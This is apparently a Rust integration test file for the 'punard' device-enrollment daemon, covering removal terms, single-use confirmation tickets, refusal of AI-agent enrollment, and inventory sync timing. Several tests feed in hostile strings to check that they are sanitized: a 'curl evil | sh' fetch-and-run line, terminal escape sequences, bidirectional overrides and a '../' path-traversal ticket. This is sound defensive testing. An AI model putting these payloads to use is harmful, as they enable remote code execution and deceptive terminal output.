        assert_no_root_advice(message);
    }
    assert!(
        second.exists(),
        "a refused unenroll must not cost the password"
    );
    // Asking to enroll again says who can end this one.
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "ticket": SECOND})),
    );
    assert_eq!(error["code"], "conflict");
    let message = error["message"].as_str().unwrap();
    assert!(message.contains("not removable"), "{message}");
    assert_no_root_advice(message);
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], true);
    daemon.stop();

    // An older punard, booted from a retained UKI, writes enrollment.json back
    // without the field it does not know. The term is kept apart from it too.
    let enrollment_path = dir.join("state/enrollment.json");
    let mut raw: Value = serde_json::from_slice(&fs::read(&enrollment_path).unwrap()).unwrap();
    raw.as_object_mut().unwrap().remove("removable");
    fs::write(&enrollment_path, raw.to_string()).unwrap();
    assert!(dir.join("state/enrollment-terms.json").is_file());

    // Root is refused too, and the term survived both the restart and the
    // rewrite.
    let root = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    assert_eq!(root.result("enroll.status", None)["removable"], false);
    let error = root.error("enroll.stop", None);
    assert_eq!(error["details"]["reason"], "enrollment_not_removable");
    assert_eq!(root.result("enroll.status", None)["enrolled"], true);
    assert!(root.state_path("enrollment.json").exists());
    assert!(root.state_path("device-token").exists());
    let denials = root
        .audit_events()
        .into_iter()
        .filter(|e| e["action"] == "enroll.stop" && e["decision"] == "deny")
        .count();
    assert_eq!(denials, 3, "every refused unenroll is audited");
    root.stop();
}

/// The calls the built-in agent may spend longest on are waited for past
/// the generic per-call timeout. A registration: the agent may spend its
/// whole register budget reaching Smplify, and once Smplify has recorded the
/// device it refuses a second active record for the same machine, so an
/// answer punard gave up on would leave the person unable to enroll until an
/// administrator removed the stale record. And a compliance report, which
/// carries the check-in that pins the organization's key until it is pinned.
#[test]
fn a_registration_and_a_report_slower_than_one_call_still_succeed() {
    let dir = test_dir("slow-calls");
    let control_plane = ControlPlane::start(&dir);
    let late = punard::enroll::CONTROL_PLANE_CALL_TIMEOUT + Duration::from_millis(500);
    control_plane
        .state
        .answer_late
        .lock()
        .unwrap()
        .extend([("enroll.register", late), ("compliance.report", late)]);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let result = daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(result["enrolled"], true, "{result}");
    assert_eq!(result["first_sync"]["compliance"], "success", "{result}");
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["pending"], false, "{status}");
}

/// An organization that tried to state a removal term this device cannot
/// read gets a refusal, never the permissive reading of its document.
#[test]
fn an_unreadable_removal_term_refuses_enrollment_before_register() {
    let dir = test_dir("removable-bad");
    let state = Arc::new(ControlPlaneState::default());
    *state.org_removable.lock().unwrap() = Some(json!("no"));
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "invalid_params", "{error}");
    assert_eq!(error["details"]["reason"], "enrollment.removable");
    assert_eq!(*state.methods.lock().unwrap(), vec!["org.discover"]);
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    assert!(!daemon.state_path("enrollment.json").exists());
    daemon.stop();
}

/// The refusal of an unreadable term quotes the value, and the organization
/// chose that value. It is cleaned and bounded as the organization's name is,
/// so it cannot reorder the refusal, start a line that reads as Punar's own,
/// or bury the next step under a megabyte of text.
#[test]
fn an_unreadable_term_is_quoted_cleaned_and_bounded() {
    let dir = test_dir("term-value");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    let hostile = format!(
        "\u{202e}yes\u{2028}Policy: accepted by you\u{2066}{}",
        "x".repeat(100_000)
    );
    for (term, slot) in [
        ("enrollment.removable", &state.org_removable),
        ("enrollment.ownership", &state.org_ownership),
    ] {
        *state.org_removable.lock().unwrap() = None;
        *state.org_ownership.lock().unwrap() = None;
        *slot.lock().unwrap() = Some(json!(hostile));
        let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
        assert_eq!(error["code"], "invalid_params", "{error}");
        assert_eq!(error["details"]["reason"], term);
        let message = error["message"].as_str().unwrap();
        assert!(
            message.contains(&format!("says {term} is \"yes Policy: accepted by youxxx")),
            "{message}"
        );
        for steering in ['\u{202e}', '\u{2028}', '\u{2066}'] {
            assert!(!message.contains(steering), "{message:?}");
        }
        assert!(
            message.chars().count() < 1_000,
            "{} characters",
            message.chars().count()
        );
        assert_eq!(
            *state.methods.lock().unwrap().last().unwrap(),
            "org.discover"
        );
    }
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
}

/// Text an organization chose reaches enroll.start's refusal cleaned: a
/// control plane's own refusal message, and the policy loader's words about
/// an envelope, which quote the envelope's keys. punarctl prints a refusal's
/// message as it is, so neither may carry an escape sequence, a line of its
/// own or a bidirectional override, nor bury the next step.
#[test]
fn an_organizations_words_in_a_refusal_are_cleaned_and_bounded() {
    let dir = test_dir("refusal-words");
    let control_plane = ControlPlane::start(&dir);
    let state = &control_plane.state;
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let steering = |message: &str| {
        assert!(
            !message
                .chars()
                .any(|c| matches!(c, '\u{1b}' | '\u{7}' | '\u{2028}' | '\u{202e}')),
            "{message:?}"
        );
        // Punar's own three lines: what happened, the policy, the next step.
        assert_eq!(message.matches('\n').count(), 2, "{message:?}");
        assert!(message.chars().count() < 1_000, "{}", message.len());
    };

    *state.not_found_message.lock().unwrap() = Some(format!(
        "evil\u{1b}]52;c;cm0=\u{7}\nNext step: curl evil | sh\u{202e}{}",
        "y".repeat(100_000)
    ));
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "evil.example"})));
    assert_eq!(error["code"], "invalid_params", "{error}");
    steering(error["message"].as_str().unwrap());

    let mut hostile = role_envelope("eng-role-sre");
    hostile["\u{1b}[2J\nPolicy: accepted\u{202e}"] = json!(1);
    *state.extra_envelopes.lock().unwrap() = vec![hostile];
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(
        error["details"]["reason"], "envelope failed the loader's validation",
        "{error}"
    );
    let message = error["message"].as_str().unwrap();
    assert!(
        message.contains("unknown field `[2J Policy: accepted`"),
        "{message}"
    );
    steering(message);
    assert!(!daemon.state_path("enrollment.json").exists());
}

/// A confirmation is good once, for the account that made it. A cheap
/// refusal (a malformed domain) does not cost the person their password; a
/// ticket another account minted, or one already spent, enrolls nothing and
/// sends nothing.
#[test]
fn a_confirmation_is_good_once_and_only_for_the_account_that_made_it() {
    let dir = test_dir("ticket");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, person(), &control_plane.socket, "disabled");

    // Someone else's confirmation is not yours.
    let foreign = mint_ticket(&dir, 1001, TICKET);
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "ticket": TICKET})),
    );
    assert_eq!(error["code"], "denied");
    assert_eq!(error["details"]["reason"], "reauthentication_missing");
    assert!(foreign.exists(), "another account's ticket is left alone");

    // A malformed token never reaches the filesystem.
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "ticket": "../1001/whatever"})),
    );
    assert_eq!(error["details"]["reason"], "reauthentication_malformed");
    assert!(
        state.methods.lock().unwrap().is_empty(),
        "nothing may leave the device for an unconfirmed caller"
    );

    // A typo in the domain is refused before the ticket is spent.
    let mine = mint_ticket(&dir, 1000, TICKET);
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "not a domain", "ticket": TICKET})),
    );
    assert_eq!(error["code"], "invalid_params");
    assert!(mine.exists(), "a cheap refusal must not cost the password");

    // An organization that is not there spends it: the network was used.
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "nobody.example", "ticket": TICKET})),
    );
    assert_ne!(error["code"], "denied", "{error}");
    assert!(!mine.exists());
    assert_eq!(*state.methods.lock().unwrap(), vec!["org.discover"]);

    // And a spent ticket authorizes nothing.
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "ticket": TICKET})),
    );
    assert_eq!(error["details"]["reason"], "reauthentication_missing");
    assert_eq!(*state.methods.lock().unwrap(), vec!["org.discover"]);
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    daemon.stop();
}

/// An AI agent may never choose an organization for the device: not with a
/// valid confirmation, and not as root (SPEC section 60 — root-ness inside an
/// agent scope buys no bypass). The person's ticket is left unspent, and each
/// pass runs in its own directory so its evidence is its own.
#[test]
fn an_agent_cannot_enroll_even_with_a_valid_confirmation() {
    const AGENT_PID: i32 = 4242;
    for uid in [1000, 0] {
        let dir = test_dir(&format!("agent-{uid}"));
        let cgroup = dir.join("proc").join(AGENT_PID.to_string());
        fs::create_dir_all(&cgroup).unwrap();
        fs::write(
            cgroup.join("cgroup"),
            "0::/user.slice/user-1000.slice/user@1000.service/app.slice/\
punar-agent-agt_4f21c09ab3e1.scope\n",
        )
        .unwrap();
        let state = Arc::new(ControlPlaneState::default());
        let control_plane = ControlPlane::start_with(&dir, state.clone());
        let daemon = TestDaemon::start(
            &dir,
            Peer {
                uid,
                gid: uid,
                pid: Some(AGENT_PID),
            },
            &control_plane.socket,
            "disabled",
        );
        let ticket = mint_ticket(&dir, uid, TICKET);
        for (method, params) in [
            (
                "enroll.start",
                json!({"org_domain": "acme.com", "code": "lex_agent", "ticket": TICKET}),
            ),
            ("enroll.stop", json!({"ticket": TICKET})),
        ] {
            let error = daemon.error(method, Some(params));
            assert_eq!(error["code"], "denied", "uid {uid} {method}: {error}");
            assert_eq!(error["details"]["reason"], "agent_scope");
            assert!(
                daemon
                    .audit_events()
                    .iter()
                    .any(|e| e["action"] == method && e["decision"] == "deny"),
                "uid {uid} {method}: the refusal is audited"
            );
        }
        assert!(
            ticket.exists(),
            "an agent's attempt must not burn the ticket"
        );
        assert!(state.methods.lock().unwrap().is_empty());
        assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
        daemon.stop();
    }
}

/// A real Smplify tenant can enroll a device before assigning it any policy:
/// the built-in agent answers `policy.fetch` with an empty list. Enrollment
/// must still complete — managed, no organization layers, compliance and
/// inventory reported — and unenroll cleanly.
#[test]
fn enrolling_before_the_organization_assigns_any_policy_succeeds() {
    let dir = test_dir("no-policy");
    let state = Arc::new(ControlPlaneState::default());
    state.serve_no_policy.store(true, Ordering::SeqCst);
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    let result = daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "code": "lex_empty-tenant"})),
    );
    assert_eq!(result["org"]["display_name"], "Acme Engineering");
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["enrolled"], true);
    assert_eq!(daemon.result("status", None)["mode"], "managed");
    assert!(
        !state.compliance.lock().unwrap().is_empty(),
        "the first compliance report is sent even with no organization policy"
    );
    daemon.result("enroll.stop", None);
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    daemon.stop();
}

fn read_json(path: &Path) -> Value {
    serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap()
}

/// The hash gate skips an unchanged inventory, but a 2xx proves only that the
/// request arrived: once a day an unchanged inventory is sent again. The
/// recorded send time moves only when a send succeeds.
#[test]
fn an_unchanged_inventory_is_resent_after_a_day_and_only_a_success_moves_the_clock() {
    const LONG_AGO: &str = "2026-01-01T00:00:00Z";
    let dir = test_dir("resend-floor");
    let state_file = dir.join("state/enrollment.json");
    let control_plane = ControlPlane::start(&dir);
    {
        let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
        daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
        daemon.result("reconcile", None);
        daemon.stop();
    }
    assert_eq!(
        control_plane.state.inventory.lock().unwrap().len(),
        1,
        "hash-gated within the day"
    );
    let record = read_json(&state_file);
    let hash = record["last_inventory_hash"].clone();
    assert!(
        record["last_inventory_sent_at"]
            .as_str()
            .is_some_and(|at| at.ends_with('Z')),
        "{record}"
    );

    // A day and more has passed, as far as the record says, and the control
    // plane is down: the due send fails and the record keeps the old time.
    let mut record = read_json(&state_file);
    record["last_inventory_sent_at"] = json!(LONG_AGO);
    fs::write(&state_file, record.to_string()).unwrap();
    let state = control_plane.stop();
    {
        let daemon = TestDaemon::start(
            &dir,
            Peer::root(),
            &dir.join("control-plane.sock"),
            "enabled",
        );
        daemon.stop();
    }
    assert_eq!(read_json(&state_file)["last_inventory_sent_at"], LONG_AGO);
    assert_eq!(state.inventory.lock().unwrap().len(), 1);

    // Back online: the unchanged inventory goes out again and the time moves.
    let control_plane = ControlPlane::start_with(&dir, state);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    {
        let inventory = control_plane.state.inventory.lock().unwrap();
        assert_eq!(inventory.len(), 2);
        assert_eq!(
            inventory[0]["inventory"], inventory[1]["inventory"],
            "the floor resent it, not a change"
        );
    }
    let record = read_json(&state_file);
    assert_eq!(record["last_inventory_hash"], hash);
    assert_ne!(record["last_inventory_sent_at"], LONG_AGO);
    // Within the day the gate holds again.
    daemon.result("reconcile", None);
    assert_eq!(control_plane.state.inventory.lock().unwrap().len(), 2);
}

/// The organization chooses its display name, and punard shows it beside the
/// terms a person accepts, in every view of the enrollment, in the shell's
/// bar. It is cleaned once, where punard reads the document, so the refusal,
/// the enrollment record, `enroll.status` and the status file all carry the
/// same safe, bounded text: no control or invisible character, no line
/// separator, one space for any run of whitespace, at most 64 characters.
#[test]
fn the_organizations_name_is_cleaned_once_where_punard_reads_it() {
    let dir = test_dir("org-name");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, Arc::clone(&state));
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    *state.org_display_name.lock().unwrap() = Some(json!(format!(
        "Acme\u{1b}[8m\u{202e} (personal\u{2028}enrollment:\u{200b} nothing{}is sent) {}",
        " ".repeat(5000),
        "x".repeat(300)
    )));
    *state.org_name.lock().unwrap() = Some(json!("\u{1b}]0;Acme\u{7}\u{2066}"));
    *state.org_shown_domain.lock().unwrap() = Some(json!("acme.com\u{1b}[2K"));
    *state.org_ownership.lock().unwrap() = Some(json!("organization"));
    let expected = format!(
        "Acme[8m (personal enrollment: nothing is sent) {}\u{2026}",
        "x".repeat(16)
    );
    assert_eq!(expected.chars().count(), 64);

    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["details"]["organization_name"], expected.as_str());
    let message = error["message"].as_str().unwrap();
    for steer in ['\u{1b}', '\u{202e}', '\u{2028}', '\u{200b}', '\u{7}'] {
        assert!(!message.contains(steer), "{steer:?} in {message:?}");
    }
    assert!(message.contains(&format!("\"{expected}\"")), "{message}");
    assert!(message.len() < 1024, "{message}");

    daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
    );
    let org = daemon.result("enroll.status", None)["org"].clone();
    assert_eq!(org["display_name"], expected.as_str());
    assert_eq!(org["name"], "]0;Acme");
    assert_eq!(org["domain"], "acme.com", "the domain the person typed");
    assert_eq!(read_json(&daemon.state_path("enrollment.json"))["org"], org);
    assert_eq!(daemon.status_summary()["org_name"], expected.as_str());
}

fn wait_until(what: &str, done: impl Fn() -> bool) {
    let deadline = std::time::Instant::now() + Duration::from_secs(10);
    while !done() {
        assert!(
            std::time::Instant::now() < deadline,
            "timed out waiting for {what}"
        );
        std::thread::sleep(Duration::from_millis(5));
    }
}

/// Run a sync pass whose `method` report is held in flight while `during`
/// runs, then let it finish.
fn pass_held_at(
    daemon: &TestDaemon,
    state: &ControlPlaneState,
    method: &'static str,
    during: &dyn Fn(),
) {
    state.release_held.store(false, Ordering::SeqCst);
    state.held.store(false, Ordering::SeqCst);
    *state.hold_next.lock().unwrap() = Some(method);
    std::thread::scope(|scope| {
        let pass = scope.spawn(|| daemon.result("reconcile", None));
        wait_until("the held report", || state.held.load(Ordering::SeqCst));
        during();
        state.release_held.store(true, Ordering::SeqCst);
        pass.join().unwrap();
    });
}

/// A sync pass works from the enrollment it began with, and can outlive it:
/// its inventory report may still be in flight while `enroll.stop` runs, and
/// `enroll.start` after that. The reply must write nothing back — not the
/// ended enrollment's view, which unenroll removed and promised stays
/// removed, and not into the enrollment that replaced it, whose view and
/// inventory hash are its own.
#[test]
fn a_pass_that_outlives_its_enrollment_writes_nothing_back() {
    const SECURE_BOOT: &str =
        "machine/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c";
    let dir = test_dir("stale-pass");
    let view_path = dir.join("state/organization-view.json");
    let enrollment_path = dir.join("state/enrollment.json");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    // Something the inventory carries changes, so the next pass sends one,
    // and that report is held in flight while `during` runs.
    let pass_in_flight = |secure_boot: u8, during: &dyn Fn()| {
        write_file(&dir.join(SECURE_BOOT), [6u8, 0, 0, 0, secure_boot]);
        pass_held_at(&daemon, &state, "inventory.report", during);
    };

    // Unenrolled while the report is in flight: nothing is recreated.
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert!(view_path.exists());
    pass_in_flight(1, &|| {
        daemon.result("enroll.stop", None);
        assert!(!view_path.exists(), "unenroll removed the view");
    });
    assert_eq!(
        state.inventory.lock().unwrap().len(),
        2,
        "the reply arrived"
    );
    assert!(!view_path.exists(), "a late reply recreated the view");
    assert!(!enrollment_path.exists());

    // Unenrolled and enrolled again, now as organization-owned, possibly
    // within the same second: the late reply belongs to neither.
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    pass_in_flight(0, &|| {
        daemon.result("enroll.stop", None);
        *state.org_ownership.lock().unwrap() = Some(json!("organization"));
        daemon.result(
            "enroll.start",
            Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
        );
    });
    let inventory = state.inventory.lock().unwrap().clone();
    assert_eq!(inventory.len(), 5);
    let (owned, late) = (&inventory[3]["inventory"], &inventory[4]["inventory"]);
    assert!(owned.get("identifiers").is_some(), "{owned}");
    assert!(late.get("identifiers").is_none(), "the ended enrollment's");
    let record = read_json(&view_path);
    assert_eq!(
        record["sent"], *owned,
        "the view is the new enrollment's own"
    );
    assert_eq!(
        record["enrolled_at"],
        read_json(&enrollment_path)["enrolled_at"]
    );
    // Nor did the late reply move the new enrollment's hash: an unchanged
    // device sends nothing on the next pass.
    daemon.result("reconcile", None);
    assert_eq!(state.inventory.lock().unwrap().len(), 5);
}

/// A pass that outlives its enrollment leaves the device's sync state alone
/// too: whether a report is pending, and the sync and withheld-list
/// transitions it audits. Its reports fail against a token that no longer
/// exists, and otherwise the enrollment that replaced it would read as
/// pending, the audit would record a failure and a withheld list that were
/// not its own, and its unchanged inventory would be sent again.
#[test]
fn a_pass_that_outlives_its_enrollment_leaves_the_sync_state_alone() {
    let dir = test_dir("stale-state");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    // The first enrollment is organization-owned, and its application list
    // is withheld: the installation lists a row with no columns.
    fs::write(
        dir.join("machine/bin/flatpak"),
        "#!/bin/sh\nprintf 'not-a-flatpak-row\\n'\n",
    )
    .unwrap();
    *state.org_ownership.lock().unwrap() = Some(json!("organization"));
    daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "accept_organization_owned": true})),
    );
    let events = |action: &str, result: &str| {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == action && e["result"] == result)
            .count()
    };
    assert_eq!(events("enroll.inventory", "applications_withheld"), 1);
    let first_token = state
        .devices
        .lock()
        .unwrap()
        .keys()
        .next()
        .cloned()
        .unwrap();

    // Something the inventory carries changes, so the next pass sends one.
    // That pass is caught with its compliance report in flight while the
    // device is unenrolled and enrolled again, personally.
    write_file(
        &dir.join(
            "machine/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c",
        ),
        [6u8, 0, 0, 0, 1],
    );
    pass_held_at(&daemon, &state, "compliance.report", &|| {
        daemon.result("enroll.stop", None);
        *state.org_ownership.lock().unwrap() = None;
        daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    });
    let last_inventory = state
        .lines
        .lock()
        .unwrap()
        .iter()
        .rev()
        .find(|line| line.contains(r#""inventory.report""#))
        .cloned()
        .unwrap();
    assert!(
        last_inventory.contains(&first_token),
        "the stale pass went on to report its inventory, and was refused"
    );
    assert_eq!(events("enroll.inventory", "applications_withheld"), 1);
    assert_eq!(events("enroll.sync", "unreachable"), 0);
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["result"], "success", "{status}");
    assert_eq!(status["last_sync"]["pending"], false, "{status}");

    // The new enrollment's own next pass finds nothing to resend.
    let sent = state.inventory.lock().unwrap().len();
    daemon.result("reconcile", None);
    assert_eq!(state.inventory.lock().unwrap().len(), sent);
    assert_eq!(events("enroll.inventory", "success"), 0);
}

/// An inventory that cannot get through — too large to upload within the
/// agent's budget on a slow link, say — is not sent again on every pass. It
/// stays pending and waits, twice as long after each failure; it goes at
/// once when it changes, and a send that gets through starts the waits
/// afresh.
#[test]
fn a_failing_inventory_waits_longer_each_time_unless_it_changes() {
    const SECURE_BOOT: &str =
        "machine/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c";
    const RETRY: Duration = Duration::from_millis(1000);
    let dir = test_dir("inventory-retry");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = TestDaemon::start_with(
        &dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        Vec::new(),
        |cfg| cfg.inventory_retry_base = RETRY,
    );
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    let attempts = || {
        state
            .methods
            .lock()
            .unwrap()
            .iter()
            .filter(|method| *method == "inventory.report")
            .count()
    };
    let secure_boot = |on: u8| write_file(&dir.join(SECURE_BOOT), [6u8, 0, 0, 0, on]);
    let pass_at = |at: std::time::Instant| {
        std::thread::sleep(at.saturating_duration_since(std::time::Instant::now()));
        daemon.result("reconcile", None);
    };
    assert_eq!(attempts(), 1);

    // It changes and cannot get through; the next pass does not send it
    // again, and the device reads as pending.
    state.refuse_inventory.store(true, Ordering::SeqCst);
    secure_boot(1);
    let failed = std::time::Instant::now();
    daemon.result("reconcile", None);
    assert_eq!(attempts(), 2);
    daemon.result("reconcile", None);
    assert_eq!(attempts(), 2, "sent again at once");
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["pending"], true, "{status}");
    assert_eq!(status["last_sync"]["result"], "unreachable", "{status}");
    assert_eq!(
        state.compliance.lock().unwrap().len(),
        3,
        "compliance still goes every pass"
    );

    // After its wait it goes once more, and fails; the next wait is longer.
    let failed_again = std::time::Instant::now().max(failed + RETRY);
    pass_at(failed_again + Duration::from_millis(50));
    assert_eq!(attempts(), 3);
    pass_at(failed_again + RETRY + Duration::from_millis(300));
    assert_eq!(attempts(), 3, "the second wait is no longer than the first");

    // A changed inventory goes at once.
    secure_boot(0);
    daemon.result("reconcile", None);
    assert_eq!(attempts(), 4);

    // One that gets through starts the waits afresh: the same failed body
    // fails again, and waits only the first wait.
    state.refuse_inventory.store(false, Ordering::SeqCst);
    secure_boot(1);
    daemon.result("reconcile", None);
    assert_eq!(attempts(), 5);
    assert_eq!(state.inventory.lock().unwrap().len(), 2);
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["pending"], false, "{status}");
    state.refuse_inventory.store(true, Ordering::SeqCst);
    secure_boot(0);
    let failed = std::time::Instant::now();
    daemon.result("reconcile", None);
    assert_eq!(attempts(), 6);
    pass_at(failed + RETRY + Duration::from_millis(50));
    assert_eq!(
        attempts(),
        7,
        "a send that got through did not reset the wait"
    );
}

/// Two passes of one enrollment can overlap (the timer's and a root
/// administrator's), each working from the record it read at its start. One
/// whose inventory report failed must not put that record's hash and send
/// time back over what the other pass, which sent the same inventory, has
/// recorded since: the device would read as never having sent it.
#[test]
fn an_overlapping_pass_that_failed_does_not_undo_one_that_sent() {
    const SECURE_BOOT: &str =
        "machine/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c";
    let dir = test_dir("overlapping-passes");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let record = |field: &str| read_json(&daemon.state_path("enrollment.json"))[field].clone();
    let before = record("last_inventory_hash");

    write_file(&dir.join(SECURE_BOOT), [6u8, 0, 0, 0, 1]);
    let sent = Mutex::new(Value::Null);
    pass_held_at(&daemon, &state, "inventory.report", &|| {
        // The other pass sends the changed inventory and records it; then
        // the held one's report fails.
        daemon.result("reconcile", None);
        let recorded = record("last_inventory_hash");
        assert_ne!(recorded, before);
        *sent.lock().unwrap() = json!([recorded, record("last_inventory_sent_at")]);
        state.refuse_inventory.store(true, Ordering::SeqCst);
    });
    assert_eq!(
        json!([
            record("last_inventory_hash"),
            record("last_inventory_sent_at")
        ]),
        *sent.lock().unwrap(),
        "the failed pass put back what it had read"
    );
}

/// A changed inventory goes on the first pass after the link comes back.
/// While nothing gets through, a failing inventory builds up no wait (the
/// failure says nothing about the inventory), so it is not held back for up
/// to half an hour by an outage that is already over.
#[test]
fn a_changed_inventory_goes_as_soon_as_the_link_is_back() {
    const SECURE_BOOT: &str =
        "machine/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c";
    const RETRY: Duration = Duration::from_millis(400);
    let dir = test_dir("offline-inventory");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start_with(
        &dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        Vec::new(),
        |cfg| cfg.inventory_retry_base = RETRY,
    );
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));

    // Offline for a while, as on a flight, with an inventory that changed.
    let state = control_plane.stop();
    write_file(&dir.join(SECURE_BOOT), [6u8, 0, 0, 0, 1]);
    for wait in [RETRY, RETRY * 2, RETRY * 4] {
        daemon.result("reconcile", None);
        std::thread::sleep(wait + Duration::from_millis(50));
    }
    daemon.result("reconcile", None);

    // Back online: the very next pass sends it.
    let control_plane = ControlPlane::start_with(&dir, state);
    let sent = control_plane.state.inventory.lock().unwrap().len();
    daemon.result("reconcile", None);
    assert_eq!(
        control_plane.state.inventory.lock().unwrap().len(),
        sent + 1,
        "held back by the outage"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["pending"], false, "{status}");
}

/// The resend gate hashes what can leave the device and nothing else. The
/// hostname and a capability's value — the timezone a network hands out when
/// its owner travels — are never sent, so changing them sends no inventory:
/// one sent off its daily schedule would tell the organization when they
/// changed. The compliance report of the same pass still goes out.
#[test]
fn a_changed_hostname_or_timezone_sends_no_inventory() {
    let dir = test_dir("never-sent-values");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start_with(
        &dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        vec![
            MockCapability::new("system.hostname", json!("atlas")),
            MockCapability::new("time.timezone", json!("America/New_York")),
        ],
        |_| {},
    );
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    let first = control_plane.state.inventory.lock().unwrap()[0]["inventory"].clone();
    assert_eq!(first.get("hostname"), None);
    assert_eq!(
        first["capabilities"],
        json!([
            {"capability": "security.firewall", "supported": true},
            {"capability": "system.hostname", "supported": true},
            {"capability": "time.timezone", "supported": true},
        ])
    );
    let text = first.to_string();
    for value in ["atlas", "America/New_York"] {
        assert!(!text.contains(value), "the inventory carries {value}");
    }

    // The person travels and renames the laptop.
    let compliance = control_plane.state.compliance.lock().unwrap().len();
    for (capability, value) in [
        ("time.timezone", "Europe/Berlin"),
        ("system.hostname", "atlas-berlin"),
    ] {
        daemon.result(
            "capabilities.set",
            Some(json!({"capability": capability, "desired_state": value})),
        );
    }
    daemon.result("reconcile", None);
    assert!(
        control_plane.state.compliance.lock().unwrap().len() > compliance,
        "the pass ran and reported compliance"
    );
    assert_eq!(
        control_plane.state.inventory.lock().unwrap().len(),
        1,
        "nothing that can leave the device changed"
    );
    let lines = control_plane.state.lines.lock().unwrap().join("");
    for value in ["atlas", "Berlin", "America/New_York"] {
        assert!(!lines.contains(value), "{value} reached the control plane");
    }
}

/// A local, signed stable channel whose head (2026.08.27.1) is newer than
/// the running release (2026.08.20.1), so a person's `update check` finds an
/// update and caches the verified document.
fn configure_update_channel(cfg: &mut DaemonConfig, dir: &Path) {
    let repository = dir.join("update-source");
    let keys = dir.join("release-keys");
    let os_release = dir.join("update-os-release");
    fs::create_dir_all(&repository).unwrap();
    fs::create_dir_all(&keys).unwrap();
    fs::write(
        &os_release,
        "IMAGE_ID=punar-desktop\nIMAGE_VERSION=2026.08.20.1\n",
    )
    .unwrap();
    let signing = SigningKey::from_bytes(&[17; 32]);
    fs::write(keys.join("fixture.pub"), signing.verifying_key().to_bytes()).unwrap();
    let document = serde_json::to_vec_pretty(&json!({
        "schema_version": 1,
        "image_id": "punar-desktop",
        "architecture": "aarch64",
        "boot_platform": "uefi",
        "channel": "stable",
